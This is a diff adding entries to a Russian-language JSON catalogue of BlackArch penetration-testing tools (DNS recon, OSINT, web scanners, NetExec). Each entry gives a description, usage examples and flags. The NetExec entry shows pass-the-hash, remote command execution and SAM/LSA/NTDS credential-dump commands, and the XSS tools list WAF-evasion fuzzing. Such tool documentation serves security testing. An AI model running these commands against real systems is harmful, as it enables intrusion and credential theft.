@@ -1114,5 +1114,2578 @@
       {"flag": "-q", "description": "Тихий режим (без вывода прокси-информации)"},
       {"flag": "-f", "description": "Указать файл конфигурации"}
     ]
+  },
+  {
+    "id": "fierce",
+    "name": "Fierce",
+    "version": "1.5.0",
+    "categories": ["blackarch-recon", "blackarch-scanner"],
+    "description": "DNS reconnaissance tool for locating non-contiguous IP space",
+    "descriptionRu": "Инструмент DNS-разведки для обнаружения непрерывных и несмежных IP-пространств, связанных с доменом",
+    "helpRu": "Fierce — полусложный сканер, помогающий определить несмежное IP-пространство и имена хостов для указанных доменов. Он предназначен для обнаружения целей внутри и вне корпоративной сети.\n\nFierce НЕ является сканером уязвимостей и НЕ сканирует весь интернет. Он используется для обнаружения целей, которые чаще всего пропускают другие инструменты.\n\nОсновные возможности:\n- DNS zone transfer проверка\n- Brute-force поддоменов по словарю\n- Поиск по обратному DNS (reverse DNS)\n- Обнаружение соседних IP-адресов\n- Wildcard DNS обнаружение",
+    "url": "https://github.com/mschwager/fierce",
+    "command": "fierce",
+    "usageExamples": [
+      {"title": "Базовое сканирование домена", "command": "fierce --domain example.com", "description": "Поиск поддоменов и DNS-записей для указанного домена"},
+      {"title": "С пользовательским словарём", "command": "fierce --domain example.com --subdomain-file wordlist.txt", "description": "Перебор поддоменов по пользовательскому словарю"},
+      {"title": "Указание DNS-сервера", "command": "fierce --domain example.com --dns-servers 8.8.8.8", "description": "Использование стороннего DNS-сервера для запросов"}
+    ],
+    "parameters": [
+      {"flag": "--domain", "description": "Целевой домен для сканирования"},
+      {"flag": "--subdomain-file", "description": "Файл со списком поддоменов для перебора"},
+      {"flag": "--dns-servers", "description": "Указать DNS-серверы для запросов"},
+      {"flag": "--range", "description": "Сканировать указанный диапазон IP"},
+      {"flag": "--traverse", "description": "Количество IP для обхода рядом с найденными"}
+    ]
+  },
+  {
+    "id": "dnsrecon",
+    "name": "DNSRecon",
+    "version": "1.1.5",
+    "categories": ["blackarch-recon", "blackarch-scanner"],
+    "description": "DNS enumeration and reconnaissance tool",
+    "descriptionRu": "Мощный инструмент DNS-перечисления для сбора информации о DNS-записях, zone transfer, brute-force поддоменов",
+    "helpRu": "DNSRecon — инструмент для DNS-перечисления, который автоматизирует сбор DNS-информации о целевом домене.\n\nОсновные возможности:\n- Проверка всех NS-серверов на zone transfer (AXFR)\n- Перечисление общих DNS-записей (SOA, NS, A, AAAA, MX, TXT, SPF, DMARC и др.)\n- Обнаружение поддоменов через словарь\n- SRV-записи перечисление\n- Кэш-сноопинг\n- Zone walking (NSEC)\n- PTR-записи для IP-диапазонов",
+    "url": "https://github.com/darkoperator/dnsrecon",
+    "command": "dnsrecon",
+    "usageExamples": [
+      {"title": "Стандартное перечисление", "command": "dnsrecon -d example.com", "description": "Базовое DNS-перечисление домена"},
+      {"title": "Brute-force поддоменов", "command": "dnsrecon -d example.com -t brt -D subdomains.txt", "description": "Перебор поддоменов из словаря"},
+      {"title": "Zone transfer", "command": "dnsrecon -d example.com -t axfr", "description": "Попытка AXFR zone transfer"},
+      {"title": "Reverse DNS", "command": "dnsrecon -r 192.168.1.0/24", "description": "Обратный DNS для диапазона IP"}
+    ],
+    "parameters": [
+      {"flag": "-d", "description": "Целевой домен"},
+      {"flag": "-t", "description": "Тип перечисления (std, brt, axfr, rvl, snoop, zonewalk)"},
+      {"flag": "-D", "description": "Файл словаря для brute-force"},
+      {"flag": "-r", "description": "IP-диапазон для reverse lookup"},
+      {"flag": "-n", "description": "DNS-сервер для запросов"},
+      {"flag": "--xml", "description": "Сохранить результаты в XML"},
+      {"flag": "-j", "description": "Сохранить результаты в JSON"}
+    ]
+  },
+  {
+    "id": "whatweb",
+    "name": "WhatWeb",
+    "version": "0.5.5",
+    "categories": ["blackarch-recon", "blackarch-fingerprint", "blackarch-webapp"],
+    "description": "Next generation web scanner that identifies websites",
+    "descriptionRu": "Веб-сканер нового поколения для идентификации технологий, CMS, серверов, фреймворков и плагинов веб-сайтов",
+    "helpRu": "WhatWeb определяет веб-технологии, используемые на сайте. Он идентифицирует CMS (WordPress, Joomla, Drupal), блогплатформы, JavaScript-библиотеки, веб-серверы, встроенные устройства, версии, email-адреса, учётные записи, ошибки SQL и многое другое.\n\nWhatWeb имеет более 1800 плагинов, каждый из которых распознаёт определённую технологию.\n\nОсновные возможности:\n- Идентификация CMS и фреймворков\n- Определение версий серверов и ПО\n- Обнаружение cookies, заголовков, метатегов\n- Рекурсивное сканирование\n- Различные уровни агрессивности",
+    "url": "https://github.com/urbanadventurer/WhatWeb",
+    "command": "whatweb",
+    "usageExamples": [
+      {"title": "Быстрое сканирование", "command": "whatweb example.com", "description": "Определение технологий сайта"},
+      {"title": "Агрессивное сканирование", "command": "whatweb -a 3 example.com", "description": "Углублённое сканирование с агрессивными плагинами"},
+      {"title": "Сканирование подсети", "command": "whatweb 192.168.1.0/24 --no-errors", "description": "Сканирование всех хостов в подсети"},
+      {"title": "Вывод в JSON", "command": "whatweb --log-json=output.json example.com", "description": "Сохранение результатов в JSON"}
+    ],
+    "parameters": [
+      {"flag": "-a", "description": "Уровень агрессивности (1=стелс, 3=агрессивный, 4=тяжёлый)"},
+      {"flag": "-v", "description": "Подробный вывод"},
+      {"flag": "--color=never", "description": "Отключить цветной вывод"},
+      {"flag": "--log-json", "description": "Сохранить результат в JSON"},
+      {"flag": "--log-xml", "description": "Сохранить результат в XML"},
+      {"flag": "-U", "description": "Указать User-Agent"},
+      {"flag": "--proxy", "description": "Использовать прокси"}
+    ]
+  },
+  {
+    "id": "wafw00f",
+    "name": "wafw00f",
+    "version": "2.2.0",
+    "categories": ["blackarch-recon", "blackarch-fingerprint", "blackarch-webapp"],
+    "description": "Web Application Firewall detection tool",
+    "descriptionRu": "Инструмент обнаружения и идентификации WAF (Web Application Firewall) перед веб-приложениями",
+    "helpRu": "wafw00f — инструмент для определения наличия и типа WAF (Web Application Firewall), защищающего веб-приложение.\n\nОн отправляет ряд HTTP-запросов и анализирует ответы для определения конкретного WAF.\n\nОсновные возможности:\n- Обнаружение более 100 типов WAF/IPS/IDS\n- Определение Cloudflare, AWS WAF, ModSecurity, Imperva и др.\n- Поддержка прокси\n- Вывод в различных форматах",
+    "url": "https://github.com/EnableSecurity/wafw00f",
+    "command": "wafw00f",
+    "usageExamples": [
+      {"title": "Определение WAF", "command": "wafw00f https://example.com", "description": "Проверка наличия WAF на сайте"},
+      {"title": "Проверка всех WAF", "command": "wafw00f -a https://example.com", "description": "Проверить сайт на все известные WAF"},
+      {"title": "Список известных WAF", "command": "wafw00f -l", "description": "Показать все поддерживаемые WAF"}
+    ],
+    "parameters": [
+      {"flag": "-a", "description": "Проверить все WAF (не останавливаться после первого совпадения)"},
+      {"flag": "-l", "description": "Показать список всех поддерживаемых WAF"},
+      {"flag": "-p", "description": "Использовать HTTP-прокси"},
+      {"flag": "-o", "description": "Сохранить результаты в файл"},
+      {"flag": "-f", "description": "Формат вывода (json, csv, txt)"}
+    ]
+  },
+  {
+    "id": "spiderfoot",
+    "name": "SpiderFoot",
+    "version": "4.0",
+    "categories": ["blackarch-recon", "blackarch-social"],
+    "description": "OSINT automation tool for threat intelligence",
+    "descriptionRu": "Платформа автоматизированного OSINT для сбора разведывательных данных о целях (домены, IP, email, имена, телефоны)",
+    "helpRu": "SpiderFoot — мощная платформа для автоматизации OSINT (Open Source Intelligence). Она собирает информацию из более чем 200 источников данных.\n\nОсновные возможности:\n- Сканирование по домену, IP, email, имени, телефону, Bitcoin-адресу\n- Интеграция с 200+ источниками данных\n- Веб-интерфейс и CLI\n- Визуализация связей между данными\n- API-интеграции (Shodan, VirusTotal, HaveIBeenPwned и др.)\n- Экспорт данных в различных форматах",
+    "url": "https://github.com/smicallef/spiderfoot",
+    "command": "spiderfoot",
+    "usageExamples": [
+      {"title": "Запуск веб-интерфейса", "command": "spiderfoot -l 127.0.0.1:5001", "description": "Запустить веб-интерфейс на localhost:5001"},
+      {"title": "CLI сканирование", "command": "spiderfoot -s example.com -t DOMAIN -o output.csv", "description": "Сканирование домена в CLI с выводом в CSV"},
+      {"title": "Быстрое сканирование", "command": "spiderfoot -s example.com -q", "description": "Тихое сканирование без подробного вывода"}
+    ],
+    "parameters": [
+      {"flag": "-s", "description": "Цель сканирования (домен, IP, email и т.д.)"},
+      {"flag": "-t", "description": "Тип цели (DOMAIN, IP_ADDRESS, EMAIL_ADDRESS и др.)"},
+      {"flag": "-l", "description": "Адрес и порт веб-интерфейса"},
+      {"flag": "-o", "description": "Файл для сохранения результатов"},
+      {"flag": "-q", "description": "Тихий режим"},
+      {"flag": "-m", "description": "Указать модули для использования"}
+    ]
+  },
+  {
+    "id": "recon-ng",
+    "name": "Recon-ng",
+    "version": "5.1.2",
+    "categories": ["blackarch-recon", "blackarch-social"],
+    "description": "Full-featured web reconnaissance framework",
+    "descriptionRu": "Полнофункциональный фреймворк веб-разведки с модульной архитектурой, похожей на Metasploit",
+    "helpRu": "Recon-ng — фреймворк веб-разведки, написанный на Python. Имеет модульную архитектуру, сходную с Metasploit, и предоставляет мощную среду для проведения OSINT.\n\nОсновные возможности:\n- Модульная архитектура (recon, reporting, import, exploit, discovery)\n- Встроенная база данных для хранения результатов\n- API-ключи для интеграции с сервисами\n- Автоматизация через скрипты\n- Экспорт в HTML, CSV, JSON, XML",
+    "url": "https://github.com/lanmaster53/recon-ng",
+    "command": "recon-ng",
+    "usageExamples": [
+      {"title": "Запуск фреймворка", "command": "recon-ng", "description": "Открыть интерактивную консоль Recon-ng"},
+      {"title": "Создание workspace", "command": "recon-ng -w pentest_project", "description": "Создать/открыть рабочее пространство"},
+      {"title": "Запуск модуля", "command": "recon-ng -m recon/domains-hosts/hackertarget -o SOURCE=example.com --run", "description": "Запуск модуля поиска хостов"}
+    ],
+    "parameters": [
+      {"flag": "-w", "description": "Указать рабочее пространство"},
+      {"flag": "-m", "description": "Загрузить указанный модуль"},
+      {"flag": "-o", "description": "Установить параметр модуля"},
+      {"flag": "--run", "description": "Выполнить модуль сразу"},
+      {"flag": "-r", "description": "Указать файл ресурсов (скрипт)"}
+    ]
+  },
+  {
+    "id": "dmitry",
+    "name": "DMitry",
+    "version": "1.3a",
+    "categories": ["blackarch-recon", "blackarch-scanner"],
+    "description": "Deepmagic Information Gathering Tool",
+    "descriptionRu": "Инструмент для сбора информации о хосте: whois, поддомены, email, открытые порты",
+    "helpRu": "DMitry (Deepmagic Information Gathering Tool) — утилита для сбора максимального количества информации о целевом хосте.\n\nОсновные возможности:\n- Whois lookup по IP и домену\n- Сбор информации из Netcraft\n- Поиск поддоменов\n- Поиск email-адресов\n- Сканирование портов (TCP)\n- Сбор баннеров сервисов",
+    "url": "https://github.com/jaygreig86/dmitry",
+    "command": "dmitry",
+    "usageExamples": [
+      {"title": "Полный сбор информации", "command": "dmitry -winsepo output.txt example.com", "description": "Whois + Netcraft + поддомены + email + порты с сохранением в файл"},
+      {"title": "Сканирование портов", "command": "dmitry -p example.com", "description": "TCP сканирование портов цели"},
+      {"title": "Поиск поддоменов", "command": "dmitry -s example.com", "description": "Поиск поддоменов через поисковые системы"}
+    ],
+    "parameters": [
+      {"flag": "-w", "description": "Whois lookup"},
+      {"flag": "-i", "description": "IP whois lookup"},
+      {"flag": "-n", "description": "Получить информацию из Netcraft"},
+      {"flag": "-s", "description": "Поиск поддоменов"},
+      {"flag": "-e", "description": "Поиск email-адресов"},
+      {"flag": "-p", "description": "Сканирование TCP-портов"},
+      {"flag": "-o", "description": "Сохранить результаты в файл"}
+    ]
+  },
+  {
+    "id": "sn0int",
+    "name": "sn0int",
+    "version": "0.26.0",
+    "categories": ["blackarch-recon", "blackarch-social"],
+    "description": "Semi-automatic OSINT framework and package manager",
+    "descriptionRu": "Полуавтоматический OSINT-фреймворк с менеджером пакетов для модулей разведки",
+    "helpRu": "sn0int — полуавтоматический OSINT-фреймворк и менеджер пакетов. Он позволяет собирать разведывательные данные и хранить их в структурированной базе данных.\n\nОсновные возможности:\n- Встроенный менеджер модулей\n- Структурированная БД для хранения результатов\n- Поиск поддоменов, email, телефонов, аккаунтов\n- Интеграция с API (Shodan, VirusTotal, и др.)\n- Sandbox для модулей (безопасное выполнение)\n- Автоматический Data pipeline",
+    "url": "https://github.com/kpcyrd/sn0int",
+    "command": "sn0int",
+    "usageExamples": [
+      {"title": "Запуск фреймворка", "command": "sn0int", "description": "Открыть интерактивную консоль"},
+      {"title": "Установка модуля", "command": "sn0int pkg install kpcyrd/passive-spider", "description": "Установить модуль из реестра"},
+      {"title": "Добавить домен и запустить", "command": "sn0int add domain example.com && sn0int run kpcyrd/passive-spider", "description": "Добавить домен и запустить модуль"}
+    ],
+    "parameters": [
+      {"flag": "pkg install", "description": "Установить модуль из реестра"},
+      {"flag": "pkg search", "description": "Поиск модулей в реестре"},
+      {"flag": "add", "description": "Добавить сущность в БД (domain, email, ip и др.)"},
+      {"flag": "run", "description": "Запустить указанный модуль"},
+      {"flag": "select", "description": "Показать данные из БД"}
+    ]
+  },
+  {
+    "id": "sherlock",
+    "name": "Sherlock",
+    "version": "0.14.3",
+    "categories": ["blackarch-social", "blackarch-recon"],
+    "description": "Hunt down social media accounts by username across social networks",
+    "descriptionRu": "Поиск аккаунтов пользователя по имени на сотнях социальных сетей и платформ",
+    "helpRu": "Sherlock — инструмент для поиска аккаунтов по имени пользователя на более чем 400 социальных сетях и платформах.\n\nОсновные возможности:\n- Поиск по 400+ сайтам одновременно\n- Быстрая многопоточная проверка\n- Экспорт результатов в CSV, XLSX, JSON\n- Поддержка Tor\n- Проверка нескольких имён за раз",
+    "url": "https://github.com/sherlock-project/sherlock",
+    "command": "sherlock",
+    "usageExamples": [
+      {"title": "Поиск пользователя", "command": "sherlock username", "description": "Найти аккаунты с именем username на всех платформах"},
+      {"title": "Несколько пользователей", "command": "sherlock user1 user2 user3", "description": "Поиск нескольких имён одновременно"},
+      {"title": "С выводом в файл", "command": "sherlock username --output results.txt", "description": "Сохранить результаты в файл"},
+      {"title": "Через Tor", "command": "sherlock username --tor", "description": "Поиск через сеть Tor для анонимности"}
+    ],
+    "parameters": [
+      {"flag": "--output", "description": "Сохранить результаты в файл"},
+      {"flag": "--tor", "description": "Использовать Tor для запросов"},
+      {"flag": "--csv", "description": "Вывод в CSV формате"},
+      {"flag": "--json", "description": "Вывод в JSON формате"},
+      {"flag": "--timeout", "description": "Тайм-аут для запросов (в секундах)"},
+      {"flag": "--site", "description": "Проверить только указанные сайты"}
+    ]
+  },
+  {
+    "id": "holehe",
+    "name": "Holehe",
+    "version": "1.61",
+    "categories": ["blackarch-social", "blackarch-recon"],
+    "description": "Check if email is used on different sites",
+    "descriptionRu": "Проверка регистрации email на различных сайтах и платформах без отправки уведомлений владельцу",
+    "helpRu": "Holehe — инструмент для проверки, зарегистрирован ли email на различных платформах (Twitter, Instagram, Imgur, и др.) используя функции восстановления пароля.\n\nОсновные возможности:\n- Проверка 120+ сайтов\n- Без уведомления владельца email\n- Определение метода регистрации\n- Быстрая асинхронная проверка",
+    "url": "https://github.com/megadose/holehe",
+    "command": "holehe",
+    "usageExamples": [
+      {"title": "Проверка email", "command": "holehe user@example.com", "description": "Проверить на каких сайтах зарегистрирован email"},
+      {"title": "С выводом в CSV", "command": "holehe user@example.com --csv", "description": "Результаты в CSV формате"},
+      {"title": "Только положительные", "command": "holehe user@example.com --only-used", "description": "Показать только сайты, где email зарегистрирован"}
+    ],
+    "parameters": [
+      {"flag": "--only-used", "description": "Показать только сайты с зарегистрированным email"},
+      {"flag": "--csv", "description": "Вывод в CSV формате"},
+      {"flag": "--no-color", "description": "Отключить цветной вывод"},
+      {"flag": "-NP", "description": "Без вывода логотипа"}
+    ]
+  },
+  {
+    "id": "photon",
+    "name": "Photon",
+    "version": "1.3.2",
+    "categories": ["blackarch-recon", "blackarch-webapp"],
+    "description": "Incredibly fast crawler designed for OSINT",
+    "descriptionRu": "Невероятно быстрый веб-краулер для OSINT — извлекает URL, email, соцсети, файлы, JS-эндпоинты",
+    "helpRu": "Photon — быстрый краулер, разработанный для сбора OSINT-данных с веб-сайтов.\n\nОсновные возможности:\n- Извлечение URL (внутренних и внешних)\n- Сбор email-адресов\n- Обнаружение аккаунтов социальных сетей\n- Извлечение ключей и токенов из JavaScript\n- Скачивание файлов (PDF, PNG, и др.)\n- Извлечение строк из JavaScript-файлов\n- Поддержка прокси и пользовательских заголовков",
+    "url": "https://github.com/s0md3v/Photon",
+    "command": "photon",
+    "usageExamples": [
+      {"title": "Краулинг сайта", "command": "photon -u https://example.com", "description": "Собрать все URL, email и данные с сайта"},
+      {"title": "Глубокий краулинг", "command": "photon -u https://example.com -l 3", "description": "Краулинг с глубиной 3 уровня"},
+      {"title": "Извлечение секретов", "command": "photon -u https://example.com --keys", "description": "Поиск API-ключей и токенов в JS-файлах"}
+    ],
+    "parameters": [
+      {"flag": "-u", "description": "Целевой URL"},
+      {"flag": "-l", "description": "Глубина краулинга (по умолчанию 2)"},
+      {"flag": "-t", "description": "Количество потоков"},
+      {"flag": "--keys", "description": "Искать API-ключи и токены"},
+      {"flag": "--wayback", "description": "Использовать Wayback Machine для дополнительных URL"},
+      {"flag": "-o", "description": "Директория для сохранения результатов"}
+    ]
+  },
+  {
+    "id": "xsstrike",
+    "name": "XSStrike",
+    "version": "3.1.5",
+    "categories": ["blackarch-webapp", "blackarch-fuzzer"],
+    "description": "Advanced XSS detection and exploitation suite",
+    "descriptionRu": "Продвинутый инструмент обнаружения и эксплуатации XSS-уязвимостей с интеллектуальной генерацией пейлоадов",
+    "helpRu": "XSStrike — продвинутый инструмент для обнаружения XSS. В отличие от других XSS-сканеров, XSStrike не просто внедряет пейлоады — он анализирует ответы с помощью парсеров и генерирует пейлоады на основе контекста.\n\nОсновные возможности:\n- Интеллектуальная генерация пейлоадов на основе контекста\n- Fuzzing с помощью множества движков\n- Обнаружение и обход WAF\n- Сканирование DOM XSS\n- Краулинг для поиска XSS-точек\n- Поддержка многопоточности",
+    "url": "https://github.com/s0md3v/XSStrike",
+    "command": "xsstrike",
+    "usageExamples": [
+      {"title": "Сканирование GET-параметра", "command": "xsstrike -u 'https://example.com/page?q=test'", "description": "Проверка GET-параметра на XSS"},
+      {"title": "POST-данные", "command": "xsstrike -u https://example.com/form --data 'name=test&email=test'", "description": "Тестирование POST-параметров"},
+      {"title": "Краулинг и поиск XSS", "command": "xsstrike -u https://example.com --crawl", "description": "Автоматический краулинг и поиск XSS-точек"},
+      {"title": "Fuzzing", "command": "xsstrike -u 'https://example.com/?q=test' --fuzzer", "description": "Fuzzing для обхода WAF"}
+    ],
+    "parameters": [
+      {"flag": "-u", "description": "Целевой URL"},
+      {"flag": "--data", "description": "POST-данные"},
+      {"flag": "--crawl", "description": "Краулинг для поиска XSS-точек"},
+      {"flag": "--fuzzer", "description": "Запуск fuzzer для обхода WAF"},
+      {"flag": "--blind", "description": "Внедрение blind XSS пейлоадов"},
+      {"flag": "-t", "description": "Количество потоков"},
+      {"flag": "--headers", "description": "Пользовательские HTTP-заголовки"}
+    ]
+  },
+  {
+    "id": "dalfox",
+    "name": "Dalfox",
+    "version": "2.9.2",
+    "categories": ["blackarch-webapp", "blackarch-fuzzer"],
+    "description": "Parameter analysis and XSS scanning tool",
+    "descriptionRu": "Быстрый инструмент анализа параметров и сканирования XSS на основе Go с поддержкой автоматизации",
+    "helpRu": "Dalfox — мощный инструмент для обнаружения XSS, написанный на Go. Фокусируется на анализе параметров и автоматическом тестировании.\n\nОсновные возможности:\n- Автоматический анализ параметров\n- Reflected/Stored/DOM XSS обнаружение\n- Поддержка pipe (интеграция с другими инструментами)\n- Обход WAF\n- Кастомные пейлоады\n- Сканирование из файла URL",
+    "url": "https://github.com/hahwul/dalfox",
+    "command": "dalfox",
+    "usageExamples": [
+      {"title": "Сканирование URL", "command": "dalfox url 'https://example.com/?q=test'", "description": "XSS-сканирование параметра"},
+      {"title": "Pipe из других утилит", "command": "cat urls.txt | dalfox pipe", "description": "Массовое сканирование URL из файла"},
+      {"title": "С кастомным пейлоадом", "command": "dalfox url 'https://example.com/?q=test' --custom-payload payloads.txt", "description": "Использование своих пейлоадов"}
+    ],
+    "parameters": [
+      {"flag": "url", "description": "Режим сканирования одного URL"},
+      {"flag": "pipe", "description": "Режим чтения URL из stdin"},
+      {"flag": "file", "description": "Режим чтения URL из файла"},
+      {"flag": "--custom-payload", "description": "Файл с кастомными пейлоадами"},
+      {"flag": "--blind", "description": "Blind XSS callback URL"},
+      {"flag": "-w", "description": "Количество воркеров"},
+      {"flag": "--waf-evasion", "description": "Включить обход WAF"}
+    ]
+  },
+  {
+    "id": "feroxbuster",
+    "name": "Feroxbuster",
+    "version": "2.10.2",
+    "categories": ["blackarch-webapp", "blackarch-fuzzer"],
+    "description": "Fast, simple, recursive content discovery tool",
+    "descriptionRu": "Быстрый инструмент обнаружения контента (директорий и файлов) с рекурсивным сканированием, написанный на Rust",
+    "helpRu": "Feroxbuster — быстрый, простой и рекурсивный инструмент обнаружения контента, написанный на Rust. Альтернатива Gobuster/DIRB/dirsearch.\n\nОсновные возможности:\n- Рекурсивное сканирование (автоматически углубляется в найденные директории)\n- Очень высокая скорость (Rust)\n- Поддержка расширений файлов\n- Фильтрация по статус-коду, размеру, словам\n- Возможность возобновления сканирования\n- Поддержка SOCKS5 прокси",
+    "url": "https://github.com/epi052/feroxbuster",
+    "command": "feroxbuster",
+    "usageExamples": [
+      {"title": "Базовое сканирование", "command": "feroxbuster -u https://example.com", "description": "Рекурсивное сканирование с дефолтным словарём"},
+      {"title": "С расширениями файлов", "command": "feroxbuster -u https://example.com -x php,html,js", "description": "Поиск файлов с указанными расширениями"},
+      {"title": "Фильтрация по статусу", "command": "feroxbuster -u https://example.com -C 404,403", "description": "Исключить ответы с кодами 404 и 403"},
+      {"title": "Свой словарь", "command": "feroxbuster -u https://example.com -w /usr/share/seclists/Discovery/Web-Content/big.txt", "description": "Использовать пользовательский словарь"}
+    ],
+    "parameters": [
+      {"flag": "-u", "description": "Целевой URL"},
+      {"flag": "-w", "description": "Путь к словарю"},
+      {"flag": "-x", "description": "Расширения файлов для проверки"},
+      {"flag": "-t", "description": "Количество потоков (по умолчанию 50)"},
+      {"flag": "-C", "description": "Фильтр по статус-коду (исключить)"},
+      {"flag": "-s", "description": "Фильтр по статус-коду (включить только)"},
+      {"flag": "-n", "description": "Отключить рекурсию"},
+      {"flag": "-o", "description": "Сохранить результаты в файл"},
+      {"flag": "--depth", "description": "Глубина рекурсии"}
+    ]
+  },
+  {
+    "id": "arjun",
+    "name": "Arjun",
+    "version": "2.2.1",
+    "categories": ["blackarch-webapp", "blackarch-fuzzer"],
+    "description": "HTTP parameter discovery suite",
+    "descriptionRu": "Инструмент обнаружения скрытых HTTP-параметров GET/POST/JSON через интеллектуальный перебор",
+    "helpRu": "Arjun — инструмент для обнаружения скрытых параметров HTTP-запросов. Он использует словарь из 25,000+ параметров и отправляет их частями для максимальной скорости.\n\nОсновные возможности:\n- Обнаружение GET, POST, JSON, XML параметров\n- Интеллектуальный анализ ответов\n- Многопоточная проверка\n- Обработка нестабильных ответов\n- Импорт из Burp Suite, файлов, URL",
+    "url": "https://github.com/s0md3v/Arjun",
+    "command": "arjun",
+    "usageExamples": [
+      {"title": "Поиск GET параметров", "command": "arjun -u https://example.com/endpoint", "description": "Обнаружение скрытых GET-параметров"},
+      {"title": "POST параметры", "command": "arjun -u https://example.com/api -m POST", "description": "Поиск скрытых POST-параметров"},
+      {"title": "JSON параметры", "command": "arjun -u https://example.com/api -m JSON", "description": "Поиск параметров в JSON body"}
+    ],
+    "parameters": [
+      {"flag": "-u", "description": "Целевой URL"},
+      {"flag": "-m", "description": "Метод HTTP (GET, POST, JSON, XML)"},
+      {"flag": "-w", "description": "Пользовательский словарь"},
+      {"flag": "-t", "description": "Количество потоков"},
+      {"flag": "--headers", "description": "Пользовательские заголовки"},
+      {"flag": "-o", "description": "Сохранить результаты в файл"},
+      {"flag": "-oJ", "description": "Сохранить в JSON формате"}
+    ]
+  },
+  {
+    "id": "httpx",
+    "name": "httpx",
+    "version": "1.6.0",
+    "categories": ["blackarch-recon", "blackarch-webapp"],
+    "description": "Fast and multi-purpose HTTP toolkit",
+    "descriptionRu": "Быстрый многофункциональный HTTP-тулкит для пробинга, скриншотов, обнаружения технологий",
+    "helpRu": "httpx — быстрый и многофункциональный HTTP-тулкит от ProjectDiscovery. Позволяет запускать множество пробов с помощью retryablehttp-библиотеки.\n\nОсновные возможности:\n- Пробинг HTTP/HTTPS\n- Обнаружение статуса, заголовков, технологий\n- Скриншоты веб-страниц\n- Извлечение заголовков, favicon, хешей\n- Обнаружение CDN/WAF\n- Поддержка pipe для массового сканирования",
+    "url": "https://github.com/projectdiscovery/httpx",
+    "command": "httpx",
+    "usageExamples": [
+      {"title": "Пробинг списка доменов", "command": "cat domains.txt | httpx", "description": "Проверка доступности HTTP/HTTPS для списка доменов"},
+      {"title": "С технологиями и статусом", "command": "cat domains.txt | httpx -status-code -title -tech-detect", "description": "Показать статус, заголовок и технологии"},
+      {"title": "Скриншоты", "command": "cat domains.txt | httpx -screenshot", "description": "Сделать скриншоты всех доступных сайтов"},
+      {"title": "Поиск по favicon", "command": "echo example.com | httpx -favicon", "description": "Получить хеш favicon для поиска похожих сайтов"}
+    ],
+    "parameters": [
+      {"flag": "-status-code", "description": "Показать статус-код ответа"},
+      {"flag": "-title", "description": "Показать заголовок страницы"},
+      {"flag": "-tech-detect", "description": "Определить технологии (Wappalyzer)"},
+      {"flag": "-screenshot", "description": "Сделать скриншот страницы"},
+      {"flag": "-favicon", "description": "Получить хеш favicon"},
+      {"flag": "-o", "description": "Сохранить результаты в файл"},
+      {"flag": "-threads", "description": "Количество потоков"},
+      {"flag": "-mc", "description": "Фильтр по статус-коду (match)"},
+      {"flag": "-fc", "description": "Фильтр по статус-коду (filter)"}
+    ]
+  },
+  {
+    "id": "katana",
+    "name": "Katana",
+    "version": "1.0.5",
+    "categories": ["blackarch-recon", "blackarch-webapp"],
+    "description": "Next-generation crawling and spidering framework",
+    "descriptionRu": "Фреймворк краулинга нового поколения от ProjectDiscovery — быстрый, конфигурируемый, с headless-браузером",
+    "helpRu": "Katana — фреймворк краулинга от ProjectDiscovery. Поддерживает стандартный и headless (Chrome) режимы для обнаружения эндпоинтов.\n\nОсновные возможности:\n- Стандартный и headless (браузерный) краулинг\n- Автоматическое заполнение форм\n- Scope контроль (регулярные выражения, домены)\n- Извлечение JS-эндпоинтов\n- Пассивный режим (Wayback, CommonCrawl)\n- Поддержка pipe для массового краулинга",
+    "url": "https://github.com/projectdiscovery/katana",
+    "command": "katana",
+    "usageExamples": [
+      {"title": "Краулинг сайта", "command": "katana -u https://example.com", "description": "Стандартный краулинг с обнаружением эндпоинтов"},
+      {"title": "Headless краулинг", "command": "katana -u https://example.com -headless", "description": "Краулинг через headless Chrome (JS рендеринг)"},
+      {"title": "Пассивный режим", "command": "katana -u https://example.com -passive", "description": "Сбор URL из архивных источников (Wayback, CommonCrawl)"},
+      {"title": "Извлечение JS-эндпоинтов", "command": "katana -u https://example.com -jc", "description": "Парсинг JavaScript-файлов для обнаружения API-эндпоинтов"}
+    ],
+    "parameters": [
+      {"flag": "-u", "description": "Целевой URL"},
+      {"flag": "-headless", "description": "Использовать headless Chrome"},
+      {"flag": "-passive", "description": "Пассивный режим (архивные источники)"},
+      {"flag": "-jc", "description": "Краулинг JavaScript-файлов"},
+      {"flag": "-d", "description": "Глубина краулинга"},
+      {"flag": "-o", "description": "Сохранить результаты в файл"},
+      {"flag": "-c", "description": "Количество конкурентных запросов"},
+      {"flag": "-fs", "description": "Scope (регулярное выражение для фильтрации)"}
+    ]
+  },
+  {
+    "id": "crackmapexec-alt",
+    "name": "NetExec",
+    "version": "1.2.0",
+    "categories": ["blackarch-exploitation", "blackarch-cracker", "blackarch-windows"],
+    "description": "Network service exploitation tool (CrackMapExec successor)",
+    "descriptionRu": "Наследник CrackMapExec — инструмент для эксплуатации сетевых сервисов (SMB, WinRM, LDAP, SSH, MSSQL и др.)",
+    "helpRu": "NetExec (nxc) — наследник CrackMapExec. Мощный инструмент для проверки учётных данных и эксплуатации сетевых сервисов в Active Directory средах.\n\nОсновные возможности:\n- Проверка учётных данных по SMB, WinRM, LDAP, SSH, MSSQL, RDP\n- Выполнение команд на удалённых хостах\n- Dumping SAM/LSA/NTDS\n- Pass-the-Hash, Pass-the-Ticket\n- Kerberoasting, AS-REP Roasting\n- Модули для различных атак",
+    "url": "https://github.com/Pennyw0rth/NetExec",
+    "command": "nxc",
+    "usageExamples": [
+      {"title": "Проверка SMB учётных данных", "command": "nxc smb 192.168.1.0/24 -u admin -p 'Password123'", "description": "Проверка логина/пароля на SMB по подсети"},
+      {"title": "Pass-the-Hash", "command": "nxc smb target -u admin -H aad3b435b51404eeaad3b435b51404ee:hash", "description": "Аутентификация через NTLM хеш"},
+      {"title": "Выполнение команды", "command": "nxc smb target -u admin -p pass -x 'whoami'", "description": "Выполнить команду на удалённом хосте"},
+      {"title": "Dump SAM", "command": "nxc smb target -u admin -p pass --sam", "description": "Извлечь хеши из SAM базы"}
+    ],
+    "parameters": [
+      {"flag": "smb/winrm/ldap/ssh/mssql", "description": "Протокол для атаки"},
+      {"flag": "-u", "description": "Имя пользователя или файл"},
+      {"flag": "-p", "description": "Пароль или файл"},
+      {"flag": "-H", "description": "NTLM хеш"},
+      {"flag": "-x", "description": "Выполнить команду (cmd)"},
+      {"flag": "-X", "description": "Выполнить команду (PowerShell)"},
+      {"flag": "--sam", "description": "Dump SAM базы"},
+      {"flag": "--lsa", "description": "Dump LSA secrets"},
+      {"flag": "--ntds", "description": "Dump NTDS.dit"}
+    ]
+  },
